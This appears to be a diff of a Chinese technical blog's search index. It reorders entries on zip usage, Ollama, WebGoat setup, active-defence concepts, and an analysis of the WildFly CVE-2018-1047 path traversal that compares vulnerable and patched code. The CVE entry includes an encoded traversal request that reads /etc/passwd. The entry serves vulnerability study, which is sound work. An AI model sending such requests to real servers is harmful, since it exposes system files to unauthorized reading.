+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">unzip -l file.zip</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="⚡️-核心记忆点："><a href="#⚡️-核心记忆点：" class="headerlink" title="⚡️ 核心记忆点："></a>⚡️ 核心记忆点：</h3><ul>
+<li>压缩文件夹用 <strong><code>-r</code></strong></li>
+<li>解压到指定位置用 <strong><code>-d</code></strong></li>
+</ul>
+]]></content>
+      <categories>
+        <category>Config</category>
+      </categories>
+      <tags>
+        <tag>Config</tag>
+        <tag>zip</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Ubuntu通过Ollama部署LLM</title>
     <url>/2025/12/18/Ubuntu%E9%80%9A%E8%BF%87Ollama%E9%83%A8%E7%BD%B2LLM/</url>
     <content><![CDATA[<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>Ubuntu 24.04<br>python 3.12.3<br>ollama 0.13.4<br>git 2.43.0</p>
@@ -3942,51 +3987,6 @@
       <tags>
         <tag>Config</tag>
         <tag>LLM</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Ubuntu下的压缩和解压缩</title>
-    <url>/2026/01/27/Ubuntu%E4%B8%8B%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%92%8C%E8%A7%A3%E5%8E%8B%E7%BC%A9/</url>
-    <content><![CDATA[<p>Ubuntu 下使用 <code>zip</code> 和 <code>unzip</code> 的实用指南：</p>
-<h3 id="0-确保已安装"><a href="#0-确保已安装" class="headerlink" title="0. 确保已安装"></a>0. 确保已安装</h3><p>如果命令不存在，先安装：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt update</span><br><span class="line"><span class="built_in">sudo</span> apt install zip unzip</span><br></pre></td></tr></table></figure></p>
-<h3 id="1-压缩-zip"><a href="#1-压缩-zip" class="headerlink" title="1. 压缩 (zip)"></a>1. 压缩 (zip)</h3><p><strong>语法：</strong> <code>zip [参数] [生成的压缩包名] [要压缩的文件/目录]</code></p>
-<ul>
-<li><p><strong>压缩单个文件</strong>：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">zip output.zip file.txt</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>压缩目录（最常用，必须加 <code>-r</code>）</strong>：<br><code>-r</code> 代表递归，如果不加，只会打包空文件夹。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">zip -r website.zip /var/www/html</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>压缩多个文件</strong>：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">zip data.zip file1.txt file2.jpg file3.png</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>加密压缩</strong>（会提示输入密码）：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">zip -e secret.zip file.txt</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<h3 id="2-解压-unzip"><a href="#2-解压-unzip" class="headerlink" title="2. 解压 (unzip)"></a>2. 解压 (unzip)</h3><p><strong>语法：</strong> <code>unzip [压缩包名] [参数]</code></p>
-<ul>
-<li><p><strong>解压到当前目录</strong>：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">unzip file.zip</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>解压到指定目录（最常用，必须加 <code>-d</code>）</strong>：<br><code>-d</code> 代表 destination（目标）。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">unzip file.zip -d /opt/myapp/</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>只查看内容不解压</strong>：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">unzip -l file.zip</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<h3 id="⚡️-核心记忆点："><a href="#⚡️-核心记忆点：" class="headerlink" title="⚡️ 核心记忆点："></a>⚡️ 核心记忆点：</h3><ul>
-<li>压缩文件夹用 <strong><code>-r</code></strong></li>
-<li>解压到指定位置用 <strong><code>-d</code></strong></li>
-</ul>
-]]></content>
-      <categories>
-        <category>Config</category>
-      </categories>
-      <tags>
-        <tag>Config</tag>
-        <tag>zip</tag>
       </tags>
   </entry>
   <entry>
@@ -4387,82 +4387,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Wildfly CVE-2018-1047 漏洞研究</title>
-    <url>/2026/01/28/Wildfly-CVE-2018-1047-%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/</url>
-    <content><![CDATA[<p><strong>CVE-2018-1047</strong> 是一个存在于 <strong>WildFly</strong>（JBoss EAP 的上游项目）中关于 <strong>Undertow</strong> 子系统的路径遍历漏洞。</p>
-<p>WildFly（前身是著名的 JBoss AS）是由 Red Hat 领导开发的开源、轻量级且高性能的 Java EE / Jakarta EE 应用服务器；它是商业级产品 JBoss EAP（Enterprise Application Platform）的上游社区版本，以模块化架构、极速启动和低内存占用著称，广泛用于开发和部署企业级 Java 应用程序。<br>针对 <strong>CVE-2018-1047</strong> 的详细复盘与代码分析：</p>
-<h3 id="1-漏洞基本信息"><a href="#1-漏洞基本信息" class="headerlink" title="1. 漏洞基本信息"></a>1. 漏洞基本信息</h3><ul>
-<li><strong>漏洞编号</strong>：CVE-2018-1047</li>
-<li><strong>漏洞组件</strong>：JBoss EAP / WildFly (具体位于 <code>undertow</code> 扩展模块)</li>
-<li><strong>漏洞类型</strong>：Path Traversal (路径遍历)</li>
-<li><strong>漏洞场景</strong>：涉及 <strong>Deployment Overlays (部署覆盖)</strong> 功能时触发。</li>
-<li><strong>漏洞版本</strong>：9.x 和 11.0.0.Final</li>
-</ul>
-<h3 id="2-什么是-Deployment-Overlays？"><a href="#2-什么是-Deployment-Overlays？" class="headerlink" title="2. 什么是 Deployment Overlays？"></a>2. 什么是 Deployment Overlays？</h3><p>在分析代码前，需要理解这个业务背景。WildFly 允许管理员配置“Overlay”，即用服务器上的外部文件覆盖 WAR 包内的静态资源，而无需重新打包 WAR。</p>
-<ul>
-<li><strong>正常逻辑</strong>：用户请求 <code>/images/logo.png</code> -&gt; WildFly 发现有 Overlay -&gt; 读取 <code>/opt/wildfly/overlays/custom-logo.png</code> 返回。</li>
-<li>应用里原本有 logo.png。</li>
-<li>管理员配置一个 Overlay，指向 /etc/wildfly/custom-logo.png。</li>
-<li>当用户访问 logo.png 时，服务器会读取 Overlay 指定的文件。</li>
-<li><strong>漏洞逻辑</strong>：用户请求 <code>/images/../../etc/passwd</code> -&gt; WildFly 未经检查直接拼接路径 -&gt; 读取 <code>/etc/passwd</code> 返回。</li>
-</ul>
-<h3 id="3-代码分析"><a href="#3-代码分析" class="headerlink" title="3. 代码分析"></a>3. 代码分析</h3><p>我们对照补丁代码（Diff）进行详细解读：</p>
-<h4 id="3-1-漏洞成因"><a href="#3-1-漏洞成因" class="headerlink" title="3.1. 漏洞成因"></a>3.1. 漏洞成因</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// p 是用户请求的 URL 路径（例如 &quot;/../../etc/passwd&quot;）</span></span><br><span class="line">p = p.substring(<span class="number">1</span>); </span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">for</span> (VirtualFile overlay : overlays) &#123;</span><br><span class="line">    <span class="comment">// 【致命错误】直接使用原始路径 p 去获取文件对象</span></span><br><span class="line">    <span class="type">VirtualFile</span> <span class="variable">child</span> <span class="operator">=</span> overlay.getChild(p);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 仅仅检查文件是否存在</span></span><br><span class="line">    <span class="keyword">if</span> (child.exists()) &#123;</span><br><span class="line">        <span class="comment">// 如果存在，就认为是合法资源并返回</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ServletResource</span>(..., child, path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<ul>
-<li><strong>问题核心</strong>：代码完全信任了变量 <code>p</code>。</li>
-<li><strong>JBoss VFS 的行为</strong>：<code>overlay.getChild(p)</code> 在处理包含 <code>../</code> 的路径时，会忠实地解析为父级目录。</li>
-<li><strong>缺失的检查</strong>：代码只问了“文件存在吗？(<code>exists()</code>)”，而没有问“文件还在 Overlay 目录下吗？”。这导致攻击者可以逃逸出 Overlay 定义的文件夹。</li>
-</ul>
-<h4 id="3-2-修复逻辑"><a href="#3-2-修复逻辑" class="headerlink" title="3.2. 修复逻辑"></a>3.2. 修复逻辑</h4><p>修复方案采用了非常标准的<strong>“净化 + 验证”</strong>双重防御机制：</p>
-<p><strong>第一层防御：路径规范化 (Canonicalization)</strong></p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 使用 CanonicalPathUtils 工具类，消除路径中的 &quot;.&quot; 和 &quot;..&quot;</span></span><br><span class="line"><span class="type">String</span> <span class="variable">canonical</span> <span class="operator">=</span> CanonicalPathUtils.canonicalize(p);</span><br></pre></td></tr></table></figure>
-<ul>
-<li><strong>作用</strong>：将 <code>/images/../secure/file</code> 转换为 <code>/secure/file</code>。这能防御简单的字符串拼接攻击，确保后续处理的是纯净路径。</li>
-</ul>
-<p><strong>第二层防御：边界逃逸检测 (Boundary Check) —— 这是修复的关键！</strong></p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 使用规范化后的路径获取文件对象</span></span><br><span class="line"><span class="type">VirtualFile</span> <span class="variable">child</span> <span class="operator">=</span> overlay.getChild(canonical);</span><br><span class="line"><span class="keyword">if</span> (child.exists()) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 【核心防御】尝试获取 child 相对于 overlay 的路径</span></span><br><span class="line">        child.getPathNameRelativeTo(overlay);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 只有当上述代码不报错，才说明 child 确实在 overlay 内部，允许返回</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ServletResource</span>(..., child, canonical);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException ignore) &#123;</span><br><span class="line">        <span class="comment">// 如果抛出异常，说明 child 不在 overlay 目录下（发生了路径逃逸）</span></span><br><span class="line">        <span class="comment">// 这里捕获异常并忽略，即拒绝提供该文件</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<ul>
-<li><strong>原理</strong>：<code>getPathNameRelativeTo(parent)</code> 方法的逻辑通常是：检查 <code>parent</code> 的路径是否是 <code>child</code> 路径的前缀。</li>
-<li><strong>效果</strong>：<ul>
-<li>如果是正常请求：<code>child</code> 为 <code>/opt/overlay/img.png</code>，<code>overlay</code> 为 <code>/opt/overlay</code>。前缀匹配成功。</li>
-<li>如果是攻击请求：<code>child</code> 解析后变成 <code>/etc/passwd</code>，<code>overlay</code> 为 <code>/opt/overlay</code>。<code>/etc/passwd</code> 不以 <code>/opt/overlay</code> 开头，<strong>方法抛出异常</strong>。</li>
-</ul>
-</li>
-</ul>
-<h3 id="4-攻击复现推演"><a href="#4-攻击复现推演" class="headerlink" title="4. 攻击复现推演"></a>4. 攻击复现推演</h3><p>假设服务器上配置了一个 Overlay 目录指向 <code>/var/www/html/overlay</code>。</p>
-<ol>
-<li><p><strong>攻击者发送请求</strong>：<br><code>GET /context-path/..%2F..%2F..%2F..%2Fetc%2Fpasswd</code></p>
-</li>
-<li><p><strong>修复前 (Vulnerable)</strong>：</p>
-<ul>
-<li><code>p</code> = <code>../../../../etc/passwd</code></li>
-<li><code>overlay.getChild(p)</code> 解析指向 <code>/etc/passwd</code>。</li>
-<li><code>child.exists()</code> 返回 <code>true</code>。</li>
-<li><strong>结果</strong>：服务器读取并输出 <code>/etc/passwd</code> 的内容。</li>
-</ul>
-</li>
-<li><p><strong>修复后 (Patched)</strong>：</p>
-<ul>
-<li><code>canonical</code> = <code>../../../../etc/passwd</code> (或者被工具类处理得更干净，但这不重要)。</li>
-<li><code>child</code> 依然指向 <code>/etc/passwd</code>。</li>
-<li>执行 <code>child.getPathNameRelativeTo(overlay)</code>。</li>
-<li>系统判断：<code>/etc/passwd</code> 不是 <code>/var/www/html/overlay</code> 的子文件。</li>
-<li>抛出 <code>IllegalArgumentException</code>。</li>
-<li><strong>结果</strong>：Catch 块捕获异常，循环继续或结束，用户收到 404 或 403，<strong>攻击失败</strong>。</li>
-</ul>
-</li>
-</ol>
-]]></content>
-      <categories>
-        <category>Java Security</category>
-      </categories>
-      <tags>
-        <tag>Java Security</tag>
-        <tag>Java</tag>
-        <tag>漏洞研究</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>WebGoat靶场搭建</title>
     <url>/2026/01/05/WebGoat%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/</url>
     <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>在 SAST 和 CodeQL 的学习过程中，需要找到一个比较有价值的测试目标，目前考虑到的关键点是代码不能过于简单，否则不具备测试深度，提出的方法不具备应用价值，这里选择 WebGoat 作为初步测试目标，结合 CodeQL-Community-Packs 进行学习、分析和测试。</p>
@@ -4551,6 +4475,82 @@
       <tags>
         <tag>Java</tag>
         <tag>Config</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Wildfly CVE-2018-1047 漏洞研究</title>
+    <url>/2026/01/28/Wildfly-CVE-2018-1047-%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/</url>
+    <content><![CDATA[<p><strong>CVE-2018-1047</strong> 是一个存在于 <strong>WildFly</strong>（JBoss EAP 的上游项目）中关于 <strong>Undertow</strong> 子系统的路径遍历漏洞。</p>
+<p>WildFly（前身是著名的 JBoss AS）是由 Red Hat 领导开发的开源、轻量级且高性能的 Java EE / Jakarta EE 应用服务器；它是商业级产品 JBoss EAP（Enterprise Application Platform）的上游社区版本，以模块化架构、极速启动和低内存占用著称，广泛用于开发和部署企业级 Java 应用程序。<br>针对 <strong>CVE-2018-1047</strong> 的详细复盘与代码分析：</p>
+<h3 id="1-漏洞基本信息"><a href="#1-漏洞基本信息" class="headerlink" title="1. 漏洞基本信息"></a>1. 漏洞基本信息</h3><ul>
+<li><strong>漏洞编号</strong>：CVE-2018-1047</li>
+<li><strong>漏洞组件</strong>：JBoss EAP / WildFly (具体位于 <code>undertow</code> 扩展模块)</li>
+<li><strong>漏洞类型</strong>：Path Traversal (路径遍历)</li>
+<li><strong>漏洞场景</strong>：涉及 <strong>Deployment Overlays (部署覆盖)</strong> 功能时触发。</li>
+<li><strong>漏洞版本</strong>：9.x 和 11.0.0.Final</li>
+</ul>
+<h3 id="2-什么是-Deployment-Overlays？"><a href="#2-什么是-Deployment-Overlays？" class="headerlink" title="2. 什么是 Deployment Overlays？"></a>2. 什么是 Deployment Overlays？</h3><p>在分析代码前，需要理解这个业务背景。WildFly 允许管理员配置“Overlay”，即用服务器上的外部文件覆盖 WAR 包内的静态资源，而无需重新打包 WAR。</p>
+<ul>
+<li><strong>正常逻辑</strong>：用户请求 <code>/images/logo.png</code> -&gt; WildFly 发现有 Overlay -&gt; 读取 <code>/opt/wildfly/overlays/custom-logo.png</code> 返回。</li>
+<li>应用里原本有 logo.png。</li>
+<li>管理员配置一个 Overlay，指向 /etc/wildfly/custom-logo.png。</li>
+<li>当用户访问 logo.png 时，服务器会读取 Overlay 指定的文件。</li>
+<li><strong>漏洞逻辑</strong>：用户请求 <code>/images/../../etc/passwd</code> -&gt; WildFly 未经检查直接拼接路径 -&gt; 读取 <code>/etc/passwd</code> 返回。</li>
+</ul>
+<h3 id="3-代码分析"><a href="#3-代码分析" class="headerlink" title="3. 代码分析"></a>3. 代码分析</h3><p>我们对照补丁代码（Diff）进行详细解读：</p>
+<h4 id="3-1-漏洞成因"><a href="#3-1-漏洞成因" class="headerlink" title="3.1. 漏洞成因"></a>3.1. 漏洞成因</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// p 是用户请求的 URL 路径（例如 &quot;/../../etc/passwd&quot;）</span></span><br><span class="line">p = p.substring(<span class="number">1</span>); </span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">for</span> (VirtualFile overlay : overlays) &#123;</span><br><span class="line">    <span class="comment">// 【致命错误】直接使用原始路径 p 去获取文件对象</span></span><br><span class="line">    <span class="type">VirtualFile</span> <span class="variable">child</span> <span class="operator">=</span> overlay.getChild(p);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 仅仅检查文件是否存在</span></span><br><span class="line">    <span class="keyword">if</span> (child.exists()) &#123;</span><br><span class="line">        <span class="comment">// 如果存在，就认为是合法资源并返回</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ServletResource</span>(..., child, path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>问题核心</strong>：代码完全信任了变量 <code>p</code>。</li>
+<li><strong>JBoss VFS 的行为</strong>：<code>overlay.getChild(p)</code> 在处理包含 <code>../</code> 的路径时，会忠实地解析为父级目录。</li>
+<li><strong>缺失的检查</strong>：代码只问了“文件存在吗？(<code>exists()</code>)”，而没有问“文件还在 Overlay 目录下吗？”。这导致攻击者可以逃逸出 Overlay 定义的文件夹。</li>
+</ul>
+<h4 id="3-2-修复逻辑"><a href="#3-2-修复逻辑" class="headerlink" title="3.2. 修复逻辑"></a>3.2. 修复逻辑</h4><p>修复方案采用了非常标准的<strong>“净化 + 验证”</strong>双重防御机制：</p>
+<p><strong>第一层防御：路径规范化 (Canonicalization)</strong></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 使用 CanonicalPathUtils 工具类，消除路径中的 &quot;.&quot; 和 &quot;..&quot;</span></span><br><span class="line"><span class="type">String</span> <span class="variable">canonical</span> <span class="operator">=</span> CanonicalPathUtils.canonicalize(p);</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>作用</strong>：将 <code>/images/../secure/file</code> 转换为 <code>/secure/file</code>。这能防御简单的字符串拼接攻击，确保后续处理的是纯净路径。</li>
+</ul>
+<p><strong>第二层防御：边界逃逸检测 (Boundary Check) —— 这是修复的关键！</strong></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 使用规范化后的路径获取文件对象</span></span><br><span class="line"><span class="type">VirtualFile</span> <span class="variable">child</span> <span class="operator">=</span> overlay.getChild(canonical);</span><br><span class="line"><span class="keyword">if</span> (child.exists()) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 【核心防御】尝试获取 child 相对于 overlay 的路径</span></span><br><span class="line">        child.getPathNameRelativeTo(overlay);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 只有当上述代码不报错，才说明 child 确实在 overlay 内部，允许返回</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ServletResource</span>(..., child, canonical);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException ignore) &#123;</span><br><span class="line">        <span class="comment">// 如果抛出异常，说明 child 不在 overlay 目录下（发生了路径逃逸）</span></span><br><span class="line">        <span class="comment">// 这里捕获异常并忽略，即拒绝提供该文件</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>原理</strong>：<code>getPathNameRelativeTo(parent)</code> 方法的逻辑通常是：检查 <code>parent</code> 的路径是否是 <code>child</code> 路径的前缀。</li>
+<li><strong>效果</strong>：<ul>
+<li>如果是正常请求：<code>child</code> 为 <code>/opt/overlay/img.png</code>，<code>overlay</code> 为 <code>/opt/overlay</code>。前缀匹配成功。</li>
+<li>如果是攻击请求：<code>child</code> 解析后变成 <code>/etc/passwd</code>，<code>overlay</code> 为 <code>/opt/overlay</code>。<code>/etc/passwd</code> 不以 <code>/opt/overlay</code> 开头，<strong>方法抛出异常</strong>。</li>
+</ul>
+</li>
+</ul>
+<h3 id="4-攻击复现推演"><a href="#4-攻击复现推演" class="headerlink" title="4. 攻击复现推演"></a>4. 攻击复现推演</h3><p>假设服务器上配置了一个 Overlay 目录指向 <code>/var/www/html/overlay</code>。</p>
+<ol>
+<li><p><strong>攻击者发送请求</strong>：<br><code>GET /context-path/..%2F..%2F..%2F..%2Fetc%2Fpasswd</code></p>
+</li>
+<li><p><strong>修复前 (Vulnerable)</strong>：</p>
+<ul>
+<li><code>p</code> = <code>../../../../etc/passwd</code></li>
+<li><code>overlay.getChild(p)</code> 解析指向 <code>/etc/passwd</code>。</li>
+<li><code>child.exists()</code> 返回 <code>true</code>。</li>
+<li><strong>结果</strong>：服务器读取并输出 <code>/etc/passwd</code> 的内容。</li>
+</ul>
+</li>
+<li><p><strong>修复后 (Patched)</strong>：</p>
+<ul>
+<li><code>canonical</code> = <code>../../../../etc/passwd</code> (或者被工具类处理得更干净，但这不重要)。</li>
+<li><code>child</code> 依然指向 <code>/etc/passwd</code>。</li>
+<li>执行 <code>child.getPathNameRelativeTo(overlay)</code>。</li>
+<li>系统判断：<code>/etc/passwd</code> 不是 <code>/var/www/html/overlay</code> 的子文件。</li>
+<li>抛出 <code>IllegalArgumentException</code>。</li>
+<li><strong>结果</strong>：Catch 块捕获异常，循环继续或结束，用户收到 404 或 403，<strong>攻击失败</strong>。</li>
+</ul>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>Java Security</category>
+      </categories>
+      <tags>
+        <tag>Java Security</tag>
+        <tag>Java</tag>
+        <tag>漏洞研究</tag>
       </tags>
   </entry>
   <entry>
@@ -4717,6 +4717,100 @@
       <tags>
         <tag>Config</tag>
         <tag>uv</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>主动防御技术</title>
+    <url>/2026/03/10/%E4%B8%BB%E5%8A%A8%E9%98%B2%E5%BE%A1%E6%8A%80%E6%9C%AF/</url>
+    <content><![CDATA[<h2 id="主动防御技术"><a href="#主动防御技术" class="headerlink" title="主动防御技术"></a>主动防御技术</h2><h3 id="1-入侵阻断技术与应用-IPS-SPS"><a href="#1-入侵阻断技术与应用-IPS-SPS" class="headerlink" title="1. 入侵阻断技术与应用 (IPS/SPS)"></a>1. 入侵阻断技术与应用 (IPS/SPS)</h3><ul>
+<li><strong>核心理念</strong>：网络安全的<strong>主动防御</strong>方法，其基本原理是对目标对象的<strong>网络攻击行为进行阻断</strong>。</li>
+<li><strong>技术实现</strong>：<ul>
+<li><strong>入侵防御系统 (IPS)</strong>：根据<strong>网络包的特性及上下文进行攻击行为判断</strong>。为解决性能瓶颈，商用多采用<strong>硬件方式</strong>或基于<strong>旁路阻断 (SPS)</strong>。</li>
+<li><strong>旁路阻断 (SPS)</strong>：一般<strong>对网络延迟影响不大</strong>。</li>
+</ul>
+</li>
+<li><strong>主要作用</strong>：<strong>过滤掉有害的网络信息流，阻断入侵者对目标的攻击行为</strong>。</li>
+</ul>
+<h3 id="2-软件白名单技术与应用"><a href="#2-软件白名单技术与应用" class="headerlink" title="2. 软件白名单技术与应用"></a>2. 软件白名单技术与应用</h3><ul>
+<li><strong>核心原理</strong>：<strong>设置可信任的软件名单列表，以阻止恶意的软件在相关的网络信息系统运行</strong>。</li>
+<li><strong>应用机制</strong>：<ul>
+<li>应用审查设立<strong>初审、复审、终审</strong>三个环节，发布过程分为<strong>公示和发布</strong>两个阶段，以<strong>构建安全、可信的移动互联网安全生态环境</strong>。</li>
+<li><strong>恶意代码防护</strong>：相比黑名单，白名单能更好防范零日漏洞。</li>
+<li><strong>白环境保护</strong>：核心在于“三可信”——<strong>只有可信任的设备才能接入；只有可信任的消息才能传输；只有可信任的软件才允许执行</strong>。</li>
+</ul>
+</li>
+</ul>
+<h3 id="3-网络流量清洗技术与应用"><a href="#3-网络流量清洗技术与应用" class="headerlink" title="3. 网络流量清洗技术与应用"></a>3. 网络流量清洗技术与应用</h3><ul>
+<li><strong>工作原理 (三步曲)</strong>：<ol>
+<li><strong>流量检测</strong>：基于深度包检测 <strong>(DPI)</strong> 识别异常，<strong>快速识别隐藏在背景流量中的攻击包</strong>。</li>
+<li><strong>流量牵引与清洗</strong>：将目标系统的流量<strong>动态转发到流量清洗中心</strong>，<strong>拒绝对指向目标系统的恶意流量进行路由转发</strong>。</li>
+<li><strong>流量回注</strong>：将<strong>清洗后的干净流量回送给目标系统</strong>。</li>
+</ol>
+</li>
+<li><strong>典型应用</strong>：畸形数据报文过滤、抗拒绝服务攻击 (DDoS)、Web应用保护、<strong>DDoS高防IP服务（采用代理转发模式，流量牵引到高防IP）</strong>。</li>
+</ul>
+<h3 id="4-可信计算技术与应用-核心重点"><a href="#4-可信计算技术与应用-核心重点" class="headerlink" title="4. 可信计算技术与应用 (核心重点)"></a>4. 可信计算技术与应用 (核心重点)</h3><ul>
+<li><strong>概念发展</strong>：早期集中于<strong>操作系统的安全机制和容错计算</strong>。由TCPA演进为TCG，制定了<strong>TPM（可信平台模块）</strong>和<strong>TNC（可信网络连接）</strong>标准。</li>
+<li><strong>信任体系</strong>：<strong>TPM是信任根</strong>。包含三个根：<strong>可信度量根RTM</strong>、<strong>可信存储根RTS</strong>、<strong>可信报告根RTR</strong>。目的是<strong>从硬件、BIOS、操作系统等各个层次上增强计算系统平台的可信性</strong>。</li>
+<li><strong>中国标准</strong>：建立起以自主密码算法 <strong>TCM为核心</strong> 的标准，由<strong>可信密码模块(TCM)和TCM服务模块(TSM)</strong>组成。</li>
+<li><strong>TNC 三层架构</strong>：<strong>完整性度量层</strong>（搜集和验证）、<strong>完整性评估层</strong>（评估状况）、<strong>网络访问层</strong>（请求处理与授权）。</li>
+</ul>
+<h3 id="5-数字水印技术与应用"><a href="#5-数字水印技术与应用" class="headerlink" title="5. 数字水印技术与应用"></a>5. 数字水印技术与应用</h3><ul>
+<li><strong>核心原理</strong>：通过<strong>数字信号处理方法，在数字化的媒体文件中嵌入特定的标记</strong>。分为<strong>水印的嵌入和水印的提取</strong>。</li>
+<li><strong>两大核心算法</strong>：<ol>
+<li><strong>空间域方法</strong>：<strong>直接叠加到数字载体的空间域上</strong>。典型如Schyndel算法（即<strong>最低有效位算法 LSB</strong>，按像素点逐一嵌入<strong>最低位上</strong>）和Patchwork算法（改变<strong>统计特性</strong>）。</li>
+<li><strong>变换域方法</strong>：利用<strong>扩展频谱通信技术</strong>和<strong>离散余弦变换(DCT)</strong>，将水印叠加到<strong>DCT域中幅值最大的前L个系数上（不包括直流分量）</strong>。</li>
+</ol>
+</li>
+<li><strong>应用场景</strong>：<strong>版权保护、信息隐藏</strong>（提升保护程度）、<strong>信息溯源、访问控制</strong>。</li>
+</ul>
+<h3 id="6-网络攻击陷阱技术-蜜罐-陷阱网络"><a href="#6-网络攻击陷阱技术-蜜罐-陷阱网络" class="headerlink" title="6. 网络攻击陷阱技术 (蜜罐/陷阱网络)"></a>6. 网络攻击陷阱技术 (蜜罐/陷阱网络)</h3><ul>
+<li><strong>核心理念</strong>：一种<strong>主动的防御方法</strong>，帮助防守方<strong>获得信息优势</strong>。能<strong>消耗攻击者资源、加重工作量、迷惑/跟踪攻击者、制止破坏行为，形成威慑</strong>。</li>
+<li><strong>蜜罐主机技术</strong>：<ul>
+<li><strong>空系统</strong>：<strong>标准的机器，运行着真实完整的OS及程序</strong>，包含<strong>真实系统中的漏洞</strong>。</li>
+<li><strong>镜像系统</strong>：建立<strong>提供敌手感兴趣的服务的服务器镜像</strong>，具有<strong>较强的欺骗性</strong>。</li>
+<li><strong>虚拟系统</strong>：在<strong>真实物理机上运行仿真软件</strong>，运行<strong>多个不同OS（虚拟机）</strong>。</li>
+</ul>
+</li>
+<li><strong>陷阱网络发展</strong>：<ul>
+<li>第一代：<strong>多个设备共同组成</strong>，不对外限制但<strong>对内加强控制</strong>，必须<strong>获取系统活动记录（远程日志、监控软件）</strong>。</li>
+<li>第二代：实现<strong>集成系统</strong>（监控非授权、隐蔽性更强、可积极响应限制非法活动）。</li>
+<li>第三代：<strong>虚拟陷阱网络 (Virtual Honeynets)</strong>，将功能<strong>集中到一个物理设备中运行</strong>。</li>
+</ul>
+</li>
+</ul>
+<h3 id="7-入侵容忍及系统生存技术"><a href="#7-入侵容忍及系统生存技术" class="headerlink" title="7. 入侵容忍及系统生存技术"></a>7. 入侵容忍及系统生存技术</h3><ul>
+<li><strong>核心理念</strong>：<strong>安全3.0理念是容忍入侵</strong>（区别于1.0挡在门外，2.0检测隔离），目标是实现<strong>网络安全弹性，具有容侵能力、可恢复能力</strong>。</li>
+<li><strong>生存性3R方法</strong>：将系统划分为<strong>不可攻破的安全核和可恢复部分</strong>（假定<strong>基本服务不可攻破</strong>）。包含三策略：<strong>抵抗(Resistance)、识别(Recognition)、恢复(Recovery)</strong>。</li>
+<li><strong>关键技术与应用</strong>：<ul>
+<li><strong>分布式共识</strong>（如<strong>区块链</strong>，<strong>众多对等节点组成，去中心化</strong>，避免单一缺陷）。</li>
+<li><strong>门限密码</strong>（如<strong>弹性CA系统</strong>，<strong>容忍一台或多台设备被入侵</strong>，将私钥<strong>分解成若干个数的和</strong>）。</li>
+<li><strong>主动恢复</strong>（周期性<strong>转变到可信状态</strong>）与<strong>多样性设计</strong>（避免通用模式失效）。</li>
+</ul>
+</li>
+</ul>
+<h3 id="8-隐私保护技术与应用"><a href="#8-隐私保护技术与应用" class="headerlink" title="8. 隐私保护技术与应用"></a>8. 隐私保护技术与应用</h3><ul>
+<li><strong>四类隐私</strong>：<strong>身份隐私、属性隐私、社交关系隐私、位置轨迹隐私</strong>。</li>
